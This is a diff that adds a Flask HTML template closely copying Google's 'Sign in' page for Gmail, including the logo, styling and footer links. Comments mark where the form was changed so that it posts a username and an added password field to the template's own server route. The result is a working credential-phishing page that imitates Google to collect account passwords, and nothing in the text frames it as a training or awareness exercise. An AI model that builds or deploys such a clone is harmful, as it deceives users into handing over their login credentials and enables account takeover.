@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f4f9;
+            color: #1f1f1f;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 448px;
+            border-radius: 28px;
+            padding: 40px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .google-logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin-bottom: 8px;
+            line-height: 1.25;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #444746;
+            margin-bottom: 32px;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 20px 16px 6px 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background-color: transparent;
+            color: #1f1f1f;
+        }
+
+        .input-field:focus {
+            border: 2px solid #0b57d0;
+            padding: 19px 15px 5px 15px;
+        }
+
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 18px;
+            font-size: 16px;
+            color: #444746;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 6px;
+            font-size: 12px;
+            color: #0b57d0;
+        }
+
+        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
+            color: #444746;
+        }
+
+        .forgot-link {
+            font-size: 14px;
+            font-weight: 500;
+            color: #0b57d0;
+            text-decoration: none;
+            align-self: flex-start;
+            margin-top: -4px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .guest-notice {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.4;
+            margin-top: 16px;
+            margin-bottom: 32px;
+        }
+
+        .guest-notice a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        .btn-create {
+            background: none;
+            border: none;
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 10px 12px;
+            margin-left: -12px;
+            border-radius: 20px;
+        }
+
+        .btn-create:hover {
+            background-color: #f0f4f9;
+        }
+
+        .btn-next {
+            background-color: #0b57d0;
+            color: #ffffff;
+            border: none;
+            border-radius: 20px;
+            height: 40px;
+            padding: 0 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #0842a0;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        /* Bottom Footer */
+        .footer {
+            width: 100%;
+            max-width: 448px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+            padding: 0 16px;
+            font-size: 12px;
+            color: #444746;
+        }
+
+        .lang-select {
+            background: none;
+            border: none;
+            color: #1f1f1f;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .footer-links a {
+            color: #444746;
+            text-decoration: none;
+            padding: 6px;
+        }
+
+        .footer-links a:hover {
+            color: #1f1f1f;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="card">
+        <svg class="google-logo" viewBox="0 0 24 24">
+            <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.14h6.6c-.28 1.52-1.13 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-8.8z"/>
+            <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.26v3.15C3.25 21.3 7.31 24 12 24z"/>
+            <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.26C.46 8.17 0 9.99 0 12s.46 3.83 1.26 5.42l4.02-3.15z"/>
+            <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.26 6.58l4.02 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
+        </svg>
+
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <!-- Email/Phone Field -->
+            <div class="input-group">
+                <input type="text" id="identifier" name="username" class="input-field" placeholder=" " required />
+                <label for="identifier" class="input-label">Email or phone</label>
+            </div>
+
+            <!-- ADDED: Password Field -->
+            <div class="input-group">
+                <input type="password" id="password" name="password" class="input-field" placeholder=" " required />
+                <label for="password" class="input-label">Password</label>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot email?</a>
+
+            <p class="guest-notice">
+                Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a>
+            </p>
+
+            <div class="actions">
+                <button type="button" class="btn-create">Create account</button>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </main>
+
+    <footer class="footer">
+        <select class="lang-select">
+            <option>English (United States)</option>
+            <option>English (United Kingdom)</option>
+            <option>Español</option>
+            <option>Français</option>
+        </select>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+</body>
+</html>
